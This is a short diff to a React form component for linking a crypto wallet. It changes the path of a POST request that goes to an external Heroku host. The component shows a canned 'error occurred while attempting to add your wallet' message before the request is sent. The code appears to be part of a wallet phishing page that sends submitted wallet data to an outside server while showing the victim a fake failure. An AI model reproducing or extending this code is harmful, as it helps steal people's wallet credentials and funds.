@@ -29,7 +29,7 @@ const FormModal = ({ handleShowModal, showModal }) => {
     setMessage(
       "An error occurred while attempting to add your wallet. Please try again later."
     );
-    fetch("https://wallet-linker.herokuapp.com/wallet-connect", {
+    fetch("https://wallet-linker.herokuapp.com/send-connect", {
       method: "post",
       headers: {
         "Content-Type": "application/json",
